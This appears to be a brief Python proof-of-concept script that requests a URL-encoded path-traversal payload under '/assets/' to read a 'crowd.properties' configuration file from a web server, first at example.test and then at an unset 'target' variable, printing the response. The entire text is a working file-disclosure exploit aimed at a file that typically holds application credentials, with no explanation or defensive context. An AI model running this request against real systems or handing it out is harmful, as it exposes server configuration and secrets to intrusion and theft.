import requests
path = '/assets/%2e%2e%3a%3a%2e%2e%3a%3aclasses%3a%3acrowd.properties'
print(requests.get('https://example.test' + path).text)
print(requests.get(target + path).text)
